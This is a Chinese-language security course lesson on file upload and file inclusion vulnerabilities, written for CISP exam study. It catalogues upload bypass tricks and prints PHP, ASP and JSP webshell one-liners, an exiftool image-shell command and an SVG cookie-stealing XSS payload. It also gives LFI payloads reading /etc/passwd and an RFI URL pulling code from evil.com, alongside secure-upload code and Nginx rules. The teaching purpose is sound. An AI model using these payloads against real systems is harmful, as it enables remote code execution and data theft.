# Day 54：文件上传漏洞

> **所属周**：Week 8 — 应用安全 · **主题**：文件上传攻击与安全防御

---

## 📑 目录

1. [文件上传漏洞概述](#一文件上传漏洞概述)
2. [上传绕过技术全景](#二上传绕过技术全景)
3. [文件类型检测绕过](#三文件类型检测绕过)
4. [恶意文件类型详解](#四恶意文件类型详解)
5. [安全文件上传实现](#五安全文件上传实现)
6. [文件包含漏洞](#六文件包含漏洞)
7. [现实案例分析](#七现实案例分析)
8. [CISP考试速查](#cisp考试速查)
9. [自检清单](#自检清单)

---

## 一、文件上传漏洞概述

### 1.1 攻击路径

```
文件上传攻击完整流程：

  攻击者上传恶意文件 → 服务器存储 → 攻击者访问执行 → 获得控制权

三个关键步骤：
  ① 绕过文件类型/大小检查
  ② 文件被存储到Web可访问的目录
  ③ 攻击者能够访问并触发执行

风险等级：
  · 直接上传WebShell → 严重！远程代码执行
  · 上传HTML/JS → 高危，XSS攻击
  · 上传恶意文档 → 中高，钓鱼/恶意宏
```

### 1.2 检测防护层次

```
服务器端检测层次（由浅到深）：

Layer 1: 前端JS验证 → 极易绕过（Burp拦截改请求）
Layer 2: Content-Type检查 → 容易绕过（修改MIME头）
Layer 3: 文件扩展名检查 → 黑名单易绕过
Layer 4: 文件头(Magic Bytes)检查 → 较难但可伪造
Layer 5: 文件内容分析 → 较强，需深度检测
Layer 6: 沙箱行为分析 → 最强，但有性能开销
```

---

## 二、上传绕过技术全景

### 2.1 前端JS验证绕过

```javascript
// 前端验证（形同虚设！）
function validate() {
  var ext = file.value.split('.').pop();
  if (ext != 'jpg' && ext != 'png') {
    alert('只允许上传图片！');
    return false;
  }
}

绕过方法：
  ① 禁用JavaScript
  ② Burp Suite拦截请求，修改文件名
  ③ 浏览器开发者工具修改JS代码
  ④ 直接构造HTTP请求（curl/Python requests）
```

### 2.2 Content-Type绕过

```
检查Content-Type请求头：
  if ($_FILES['file']['type'] != 'image/jpeg') 
      die('不是图片');

绕过：
  抓包修改 Content-Type: application/x-php → image/jpeg
  
  Content-Type只是HTTP头 → 客户端可控 → 不可信！
```

### 2.3 黑名单绕过

```
黑名单：禁止 .php, .asp, .aspx, .jsp

绕过方式：
  ① 大小写：.Php, .pHp
  ② 双扩展：.php.jpg (Apache解析顺序漏洞)
  ③ 特殊扩展：
     · .php5, .phtml, .pht, .phps, .phar (PHP)
     · .asp;.jpg (IIS解析漏洞)
     · .asa, .cer, .cdx (IIS)
     · .jspx, .jspf (Tomcat)
  ④ 点/空格/斜杠：
     · shell.php. → Apache变为.php
     · shell.php%00.jpg → 空字节截断
     · shell.php/. → Nginx配置错误
  ⑤ Windows特性：
     · shell.php::$DATA → NTFS流
     · shell.php. .jpg → 末尾点/空格
```

### 2.4 .htaccess绕过

```
如果服务器允许上传.htaccess：

  上传 .htaccess 文件内容：
  AddType application/x-httpd-php .jpg
  → 所有.jpg文件被PHP解析器执行

  或：
  <FilesMatch "evil.jpg">
    SetHandler application/x-httpd-php
  </FilesMatch>
```

---

## 三、文件类型检测绕过

### 3.1 文件头（Magic Bytes）

```
常见文件头：

类型     Magic Bytes
JPEG     FF D8 FF E0/E1
PNG      89 50 4E 47 (‰PNG)
GIF      47 49 46 38 (GIF8)
PDF      25 50 44 46 (%PDF)
ZIP      50 4B 03 04 (PK..)
PHP      正常是 <?php (但可用 BOM + JS 混合)

绕过：在PHP文件开头添加图片文件头
  GIF89a<?php system($_GET['cmd']); ?>
  → 文件头是GIF → 通过检查
  → 但访问时PHP解析器会执行 <?php 之后的内容
```

### 3.2 图片马（Image Shell）

```
图片WebShell制作：

方法1 — 直接附加：
  copy /b normal.jpg + shell.php evil.jpg
  → 图片浏览正常显示
  → 但PHP代码被附加在末尾

方法2 — EXIF注入：
  在JPG的EXIF评论域中插入PHP代码
  exiftool -Comment='<?php system($_GET["c"]); ?>' pic.jpg

方法3 — IDAT块注入：
  在PNG的IDAT数据块中插入代码

触发方式：
  · 配合本地文件包含(LFI)；include('evil.jpg')
  · .htaccess设置.jpg被PHP解析
```

---

## 四、恶意文件类型详解

### 4.1 WebShell语言分类

```
PHP WebShell (一句话木马)：
  <?php @eval($_POST['cmd']); ?>
  <?php system($_GET['c']); ?>
  <?php assert($_POST['x']); ?>

ASP/ASP.NET：
  <% eval request("cmd") %>
  <%@ Page Language="Jscript"%><%eval(Request.Item["cmd"])%>

JSP：
  <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

Python/WSGI：
  通过上传.py文件到可执行目录
```

### 4.2 SVG XSS

```
SVG文件本身是XML → 可以嵌入JavaScript！

<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

上传为头像/图标 → 被浏览器解析 → XSS执行！

防御：
  ✅ 禁止上传SVG（或彻底清理script标签）
  ✅ SVG使用独立域名(沙箱)
  ✅ Content-Security-Policy防止执行
```

### 4.3 其他危险文件类型

| 文件类型 | 风险 |
|----------|------|
| .html/.htm | XSS、钓鱼 |
| .svg | XSS |
| .xml | XXE（XML外部实体攻击） |
| .yml/.yaml | 反序列化攻击 |
| .csv | CSV注入（=cmd\| ...） |
| .pdf | 嵌入JS、钓鱼链接 |
| .zip | 潜在WebShell，ZIP炸弹 |

---

## 五、安全文件上传实现

### 5.1 安全上传检查清单

```
✅ 白名单扩展名（不是黑名单！）
✅ 检查文件头Magic Bytes（不只是Content-Type）
✅ 文件重命名（随机名，不保留原始文件名）
✅ 存储目录在Web根目录之外
✅ 多因素检测（扩展名+文件头+内容分析）
✅ 限制文件大小
✅ 上传目录禁用脚本执行
   Apache: php_flag engine off
   Nginx: 内部重定向 + 禁止PHP处理
✅ 使用文件扫描服务(ClamAV)
✅ 认证上传（仅登录用户）
✅ 日志记录所有上传操作
```

### 5.2 安全配置示例

```nginx
# Nginx：上传目录配置（防止脚本执行）
location /uploads/ {
    # 只允许静态资源请求
    location ~ \.(jpg|jpeg|png|gif|pdf)$ {
        expires 30d;
        add_header Cache-Control "public";
    }
    # 阻止任何脚本执行
    location ~ \.php$ {
        deny all;
    }
}

# 或直接禁止上传目录执行任何脚本
location ^~ /uploads/ {
    location ~* \.(php|pl|py|jsp|asp|sh|cgi)$ {
        return 403;
    }
}
```

### 5.3 代码实现示例

```php
// 安全的文件上传处理
function secureUpload($file) {
    // 1. 白名单扩展名
    $allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowed)) return false;
    
    // 2. 检查MIME类型（服务端判断）
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file['tmp_name']);
    $allowedMime = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
    if (!in_array($mime, $allowedMime)) return false;
    
    // 3. 检查文件头（Magic Bytes）
    $handle = fopen($file['tmp_name'], 'rb');
    $header = fread($handle, 4);
    fclose($handle);
    // 验证JPEG: FF D8 FF, PNG: 89 50 4E 47, GIF: 47 49 46
    
    // 4. 重新生成文件名
    $newName = bin2hex(random_bytes(16)) . '.' . $ext;
    
    // 5. 存储到非Web目录或验证通过后复制
    move_uploaded_file($file['tmp_name'], '/var/storage/' . $newName);
}
```

---

## 六、文件包含漏洞（LFI/RFI）

### 6.1 本地文件包含(LFI)

```
LFI (Local File Inclusion)：

  include($_GET['page']);  // 危险！

  攻击：?page=../../../etc/passwd
  → 读取服务器文件

  进阶：?page=../../../var/log/apache2/access.log
  → 日志中包含攻击者的User-Agent（已插入PHP代码）
  → include(access.log) → 执行PHP代码！

  PHP封装器：
  ?page=php://filter/convert.base64-encode/resource=config.php
  → Base64编码读取源码
```

### 6.2 远程文件包含(RFI)

```
RFI (Remote File Inclusion)：

  include($_GET['page']);  // allow_url_include = On
  ?page=http://evil.com/shell.txt
  → 服务器下载并执行远程PHP代码

  防御：
  ✅ 永远不要将用户输入直接传给include
  ✅ 使用白名单映射（而不是直接使用文件名）
  ✅ allow_url_include = Off (php.ini)
```

---

## 七、现实案例分析

| 时间 | 事件 | 漏洞类型 | 影响 |
|------|------|----------|------|
| 2015 | 某简历网站 | 文件上传绕过 | 2000万用户简历泄露 |
| 2017 | Equifax | 文件上传+解析 | 1.47亿用户信息泄露 |
| 2019 | Capital One | SSRF+元数据窃取 | 1亿+账户数据 |
| 2020 | 某社交App | 图片上传未检测 | 用户头像上传WebShell |
| 2021 | Apache 0-day | 路径穿越 | 广泛影响 |

---

## 八、CISP考试速查

| 考点 | 记忆要点 |
|------|---------|
| 文件上传防护 | "白名单扩名 + 文件头检查 + 随机命名 + 非Web目录" |
| Content-Type | "客户端可控，不可信" |
| 图片马原理 | "文件头伪装 + PHP代码嵌入 + LFI或.htaccess触发" |
| LFI与RFI | "LFI本地、RFI远程，都是include不验证用户输入" |

---

## 九、自检清单

- [ ] 文件上传的六层检测由浅到深是什么？
- [ ] 至少知道5种扩展名绕过技术？
- [ ] 图片马的制作和触发方式？
- [ ] SVG文件为什么是安全风险？
- [ ] 安全文件上传的7大最佳实践？
- [ ] LFI和RFI的区别？
- [ ] PHP的allow_url_include作用？

---

> **下一步**：Day 55 学习安全编码实践——输入验证、输出编码与SAST。
